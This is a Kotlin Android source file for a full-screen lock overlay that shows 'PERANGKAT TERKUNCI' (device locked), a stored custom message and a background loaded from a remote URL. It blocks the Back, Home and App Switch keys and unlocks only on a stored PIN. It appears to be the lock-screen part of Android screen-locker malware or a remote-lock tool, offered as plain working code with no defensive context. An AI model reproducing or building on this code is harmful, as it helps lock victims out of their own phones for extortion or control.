package com.sanz.epep.overlay

import android.content.Context
import android.graphics.*
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.GradientDrawable
import android.os.VibrationEffect
import android.os.Vibrator
import android.text.InputType
import android.view.Gravity
import android.view.KeyEvent
import android.widget.*
import com.sanz.epep.data.local.PrefsManager
import java.net.URL

class LockOverlayView(context: Context) : FrameLayout(context) {

    var onUnlocked: (() -> Unit)? = null
    private val pinInput: EditText
    private val statusText: TextView

    init {
        isFocusable = true
        isClickable = true

        // Default background gradient gelap
        setBackgroundColor(Color.BLACK)

        // Load custom background dari URL kalau ada
        val bgUrl = PrefsManager.lockBgUrl
        if (bgUrl.isNotEmpty()) {
            Thread {
                try {
                    val bmp = BitmapFactory.decodeStream(URL(bgUrl).openStream())
                    post {
                        val drawable = BitmapDrawable(resources, bmp)
                        drawable.alpha = 180 // semi-transparan agar teks tetap terbaca
                        background = drawable
                    }
                } catch (_: Exception) {
                    // Gagal load, tetap pakai background hitam
                    post {
                        val gradient = GradientDrawable(
                            GradientDrawable.Orientation.TOP_BOTTOM,
                            intArrayOf(
                                Color.parseColor("#B71C1C"),
                                Color.parseColor("#880E0E"),
                                Color.parseColor("#4A0000")
                            )
                        )
                        background = gradient
                    }
                }
            }.start()
        } else {
            val gradient = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(
                    Color.parseColor("#B71C1C"),
                    Color.parseColor("#880E0E"),
                    Color.parseColor("#4A0000")
                )
            )
            background = gradient
        }

        val container = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(80, 0, 80, 0)
        }

        val lockIcon = TextView(context).apply {
            text = "🔒"
            textSize = 72f
            gravity = Gravity.CENTER
        }
        container.addView(lockIcon, lp().apply { bottomMargin = 24 })

        val title = TextView(context).apply {
            text = "PERANGKAT TERKUNCI"
            setTextColor(Color.WHITE)
            textSize = 24f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            setShadowLayer(8f, 0f, 0f, Color.BLACK)
        }
        container.addView(title, lp().apply { bottomMargin = 24 })

        val divider = android.view.View(context).apply {
            setBackgroundColor(Color.parseColor("#55FFFFFF"))
        }
        container.addView(divider, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 2
        ).apply { bottomMargin = 24 })

        val messageText = TextView(context).apply {
            text = PrefsManager.lockMessage
            setTextColor(Color.parseColor("#FFCDD2"))
            textSize = 18f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            setPadding(24, 16, 24, 16)
            setBackgroundColor(Color.parseColor("#88000000"))
        }
        container.addView(messageText, lp().apply { bottomMargin = 40 })

        val subtitle = TextView(context).apply {
            text = "Masukkan PIN untuk membuka"
            setTextColor(Color.parseColor("#FFAB91"))
            textSize = 13f
            gravity = Gravity.CENTER
        }
        container.addView(subtitle, lp().apply { bottomMargin = 16 })

        pinInput = EditText(context).apply {
            hint = "● ● ● ●"
            setHintTextColor(Color.parseColor("#55FFFFFF"))
            setTextColor(Color.WHITE)
            textSize = 28f
            gravity = Gravity.CENTER
            inputType = InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD
            letterSpacing = 0.5f
            maxLines = 1
            setPadding(40, 24, 40, 24)
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#33000000"))
                cornerRadius = 16f
                setStroke(2, Color.parseColor("#55FFFFFF"))
            }
        }
        container.addView(pinInput, lp().apply { bottomMargin = 20 })

        val unlockBtn = Button(context).apply {
            text = "🔓 BUKA KUNCI"
            setTextColor(Color.WHITE)
            textSize = 16f
            typeface = Typeface.DEFAULT_BOLD
            setPadding(40, 24, 40, 24)
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#D32F2F"))
                cornerRadius = 16f
                setStroke(2, Color.parseColor("#FFCDD2"))
            }
            setOnClickListener { attemptUnlock() }
        }
        container.addView(unlockBtn, lp().apply { bottomMargin = 16 })

        statusText = TextView(context).apply {
            setTextColor(Color.parseColor("#FFEB3B"))
            textSize = 14f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
        }
        container.addView(statusText, lp())

        addView(container, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT,
            Gravity.CENTER
        ))

        pinInput.setOnKeyListener { _, keyCode, event ->
            if (keyCode == KeyEvent.KEYCODE_ENTER && event.action == KeyEvent.ACTION_UP) {
                attemptUnlock(); true
            } else false
        }
    }

    private fun attemptUnlock() {
        val pin = pinInput.text.toString()
        if (pin.isEmpty()) {
            statusText.text = "⚠️ Masukkan PIN"
            return
        }
        if (pin == PrefsManager.lockPin) {
            PrefsManager.lockPin = ""
            PrefsManager.lockMessage = "Perangkat Terkunci"
            onUnlocked?.invoke()
        } else {
            statusText.text = "❌ PIN SALAH!"
            pinInput.text.clear()
            try {
                val vib = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                vib.vibrate(VibrationEffect.createOneShot(300, VibrationEffect.DEFAULT_AMPLITUDE))
            } catch (_: Exception) {}
        }
    }

    override fun dispatchKeyEvent(event: KeyEvent?): Boolean {
        if (event?.keyCode == KeyEvent.KEYCODE_BACK ||
            event?.keyCode == KeyEvent.KEYCODE_HOME ||
            event?.keyCode == KeyEvent.KEYCODE_APP_SWITCH) {
            return true
        }
        return super.dispatchKeyEvent(event)
    }

    private fun lp() = LinearLayout.LayoutParams(
        LinearLayout.LayoutParams.MATCH_PARENT,
        LinearLayout.LayoutParams.WRAP_CONTENT
    )
}
